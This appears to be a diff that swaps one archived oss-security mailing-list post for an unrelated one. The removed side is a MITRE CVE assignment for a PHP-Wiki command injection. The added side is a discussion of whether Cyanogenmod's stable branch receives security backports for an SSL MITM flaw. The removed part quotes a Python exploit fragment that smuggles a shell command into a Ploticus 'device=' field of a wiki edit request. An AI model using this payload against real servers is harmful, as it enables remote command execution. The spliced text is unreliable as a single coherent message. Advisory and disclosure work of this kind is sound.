@@ -1,37 +1,90 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/08/29/2
-Message-Id: <20140829090818.1BA4D6C0001@smtpvmsrv1.mitre.org>
-Date: Fri, 29 Aug 2014 05:08:18 -0400 (EDT)
-From: cve-assign@...re.org
-To: bch@...h.ai
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: PHP-Wiki Command Injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/19/4
+Message-ID: <20141019142607.GG1712@dojo.mi.org>
+Date: Sun, 19 Oct 2014 10:26:07 -0400
+From: "Mike O'Connor" <mjo@...o.mi.org>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE request: Cyanogenmod MITM
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+If an opensource project explicitly designates a "stable" release
+train, is the reasonable expectation that the stable release gets
+minimally-invasive pertinent backported security fixes from its
+development tree?  I think most of the users would say yes and
+most of the developers would rather work on the latest code.  :)
 
-> data = urllib.urlencode([('pagename','HeIp'),('edit[content]',
->       '<<Ploticus device=";echo 123\':::\' 1>&2;'+cmd+' 1>&2;echo \':::\'123 1>&2;"
->        -prefab= -csmap= data= alt= help= >>'),
->        ('edit[preview]','Preview'),('action','edit')])
-> cmd1 = urllib2.Request(domain +'/index.php/HeIp',data)
+In the Cyanogenmod case, as of today, 10.2 is labelled as "stable".
+Judging from the updates I've seen on my Cyanogenmod tablet, CM 11
+"releases" are pre-beta snapshots.  Would you, as a Cyanogenmod user,
+expect that 10.2 get security fixes?  FWIW, late last year, that's
+what Cyanogenmod said they'd do:
 
-Use CVE-2014-5519.
+http://www.cyanogenmod.org/blog/cyanogenmod-10-2-0-release
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
+but if I were to judge from this, that's fallen by the wayside.  
 
-iQEcBAEBAgAGBQJUAEHwAAoJEKllVAevmvmsETYH/RAUb7JXuixfCbDFM7/ZgRrr
-1P92G3AWIkp91RDWOQuDMy4EFqWVDiRL0Ti2SPr/77YVHjpgens8F08Y91CD5fz1
-wXkNZSAyIZ1l8SVpbEYgu3ZIy/tNSTKYWmiF4u7udtWazLWdBg0hY+ukZsGzeWJJ
-KSCnFrFlxeJbgx2MRXE2QnDoQTeDkpZ/1y6lA5M2mpu+kKgAgM53WyfQD9ZeeOTx
-8NGdEYTPtYwtzgWSqtkvuon+P1W8mTYp8e623m2PpUolsZQ0CQ/oLcX0Cbtya6y9
-4AGxiA6z7l4624et7ltQDih/pGMDl33c0h/896ddZqS/M4pDDvI+EW/px1yKnaI=
-=TuwP
------END PGP SIGNATURE-----
+This certainly isn't an issue limited to Cyanogenmod.  As just another
+example, release of ntpd deemed "stable"/"production" is 3 years old,
+and missing the fix for the monlist amplication vulnerability (though
+granted that has workarounds).  
+
+It mught behoove us to call out opensource projects whose "stable"
+releases are way out-of-date with respect to their security exposure.
+
+-Mike
+
+:After reading el reg's article regarding a cyanogenmod MITM flaw, I started
+:looking through the code to see if I could find it. It didn't take long.
+:This finding was not what users are led to believe by cyanogenmod's blog
+:post. I reported the issue to cyanogenmod, but got a rather unsatisfactory
+:reply. They didn't seem willing to modify the blog post to more accurately
+:reflect the problem. Below is my email exchange with cyanogenmod's security
+:address:
+:
+: Lord Tuskington,
+:
+: Thank your for your response. Truth is we assumed as much, but the lack of
+:meaningful information in the Register's sensational article didn't leave
+:us much room to interpret it besides what it presented at face value.
+:
+: As you noted, this has already been addressed in our shipping code branch
+:(cm-11), prior to the article's publishing. This was the net result of the
+:messaging provided in the blog post, with CM 11 being 'safe' from this
+:issue.
+:
+: We normally do not patch non-shipping code (in this case 10.2 and prior),
+:though we may in this case.
+:
+: We do not expect to make a advisory on the 10.2 item at this time.
+:
+: Thank you,
+:Abhisek Devkota
+:
+:  On Oct 17, 2014 8:50 PM, "Lord Tuskington" <l.tuskington@...il.com> wrote:
+:  Hello from Greenland!
+:
+:I think you may be confused about the issue discussed here:
+:http://www.cyanogenmod.org/blog/in-response-to-the-register-mitm-article
+:
+:If I understand correctly, the original reporter may have been referring to
+:a vulnerability fixed by this commit, which was merged 20 days ago:
+:
+:https://github.com/CyanogenMod/android_external_apache-http/commit/f925f10b1feba92868fd4e8966592ec1bf755d67
+:
+:The vulnerable code is still present in the cm-10.2 branch:
+:
+:https://github.com/CyanogenMod/android_external_apache-http/blob/cm-10.2/src/org/apache/http/conn/ssl/AbstractVerifier.java#L228-244
+:If you release an advisory, please credit "Lord Tuskington of TuskCorp" for
+:reporting this vulnerability responsibly.
+:Regards
+:
+:Lord Tuskington
+:Chief Financial Pinniped
+:TuskCorp
+
+-- 
+ Michael J. O'Connor                                          mjo@...o.mi.org
+ =--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--=
+"If death is not the end, I'd like to know what is."         -Robyn Hitchcock
+
+Content of type "application/pgp-signature" skipped
